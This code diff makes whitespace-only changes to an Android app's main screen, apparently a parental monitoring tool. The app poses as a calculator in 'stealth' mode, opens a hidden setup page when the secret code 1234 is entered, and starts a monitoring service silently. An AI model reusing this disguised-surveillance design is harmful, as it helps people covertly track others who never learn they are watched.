@@ -65,11 +65,11 @@ class MainActivity : AppCompatActivity() {
         } catch (_: Exception) {
         }
     }
-    
+
     // ═══════════════════════════════════════════════════════════
     // CALCULATOR FUNCTIONS (RELEASE MODE - STEALTH)
     // ═══════════════════════════════════════════════════════════
-    
+
     private var calculatorDisplay: android.widget.TextView? = null
     private var calculatorHistory: android.widget.TextView? = null
     private var currentNumber = ""
@@ -77,7 +77,7 @@ class MainActivity : AppCompatActivity() {
     private var previousNumber = ""
     private var lastExpression = ""
     private var justCalculated = false
-    
+
     private fun initCalculator() {
         if (BuildConfig.DEBUG) android.util.Log.i("MainActivity", "Initializing Calculator UI")
         calculatorDisplay = findViewById(R.id.calculatorDisplay)
@@ -90,27 +90,27 @@ class MainActivity : AppCompatActivity() {
             } catch (_: Exception) {
             }
         }
-        
+
         // Number buttons
         val digitViews = listOf(R.id.btn0, R.id.btn1, R.id.btn2, R.id.btn3, R.id.btn4, R.id.btn5, R.id.btn6, R.id.btn7, R.id.btn8, R.id.btn9)
         digitViews.forEachIndexed { index, viewId ->
             findViewById<android.widget.Button>(viewId)?.setOnClickListener { appendNumber(index.toString()) }
         }
         findViewById<android.widget.Button>(R.id.btnDot)?.setOnClickListener { appendNumber(".") }
-        
+
         // Operator buttons
         findViewById<android.widget.Button>(R.id.btnPlus)?.setOnClickListener { setOperator("+") }
         findViewById<android.widget.Button>(R.id.btnMinus)?.setOnClickListener { setOperator("−") }
         findViewById<android.widget.Button>(R.id.btnMultiply)?.setOnClickListener { setOperator("×") }
         findViewById<android.widget.Button>(R.id.btnDivide)?.setOnClickListener { setOperator("÷") }
-        
+
         // Function buttons
         findViewById<android.widget.Button>(R.id.btnEquals)?.setOnClickListener { calculate() }
         findViewById<android.widget.Button>(R.id.btnClear)?.setOnClickListener { clear() }
-        
+
         if (BuildConfig.DEBUG) android.util.Log.i("MainActivity", "Calculator initialized")
     }
-    
+
     private fun appendNumber(number: String) {
         if (justCalculated) {
             currentNumber = ""
@@ -139,7 +139,7 @@ class MainActivity : AppCompatActivity() {
 
         updateCalculatorDisplay()
     }
-    
+
     private fun setOperator(op: String) {
         justCalculated = false
         if (currentNumber == "Error") {
@@ -163,7 +163,7 @@ class MainActivity : AppCompatActivity() {
         justCalculated = false
         updateCalculatorDisplay()
     }
-    
+
     private fun calculate() {
         if (!justCalculated && currentNumber == "1234" && previousNumber.isEmpty() && operator.isEmpty()) {
             if (BuildConfig.DEBUG) android.util.Log.i("MainActivity", "SECRET CODE -> open SetupActivity")
@@ -176,13 +176,13 @@ class MainActivity : AppCompatActivity() {
             openSetupPage()
             return
         }
-        
+
         if (previousNumber.isEmpty() || currentNumber.isEmpty()) return
-        
+
         val currentStr = currentNumber
         val num1 = previousNumber.toDoubleOrNull() ?: return
         val num2 = currentStr.toDoubleOrNull() ?: return
-        
+
         val result = when (operator) {
             "+" -> num1 + num2
             "−" -> num1 - num2
@@ -199,7 +199,7 @@ class MainActivity : AppCompatActivity() {
         operator = ""
         updateCalculatorDisplay()
     }
-    
+
     private fun formatResult(result: Double): String {
         if (result.isNaN() || result.isInfinite()) return "Error"
         val abs = kotlin.math.abs(result)
@@ -247,7 +247,7 @@ class MainActivity : AppCompatActivity() {
             else -> ""
         }
     }
-    
+
     private fun openSetupPage() {
         try {
             startActivity(Intent(this, SetupActivity::class.java))
@@ -275,7 +275,7 @@ class MainActivity : AppCompatActivity() {
                 }
                 return
             }
-        
+
         if (!hasAllPermissions()) {
             if (BuildConfig.DEBUG) android.util.Log.w("MainActivity", "Permissions missing - staying silent, grant via Setup")
             try {
@@ -284,7 +284,7 @@ class MainActivity : AppCompatActivity() {
             }
             return
         }
-        
+
         // Start monitoring service silently
         if (preferencesManager.userDisabledMonitoring || !preferencesManager.userConsentedMonitoring) {
             if (BuildConfig.DEBUG) android.util.Log.i("MainActivity", "Monitoring disabled by user - not auto-starting")
@@ -310,7 +310,7 @@ class MainActivity : AppCompatActivity() {
         } catch (_: Exception) {
         }
     }
-    
+
     private fun hasAllPermissions(): Boolean {
         return com.redeye.parentalmonitor.utils.AppPermissions.hasAll(this)
     }
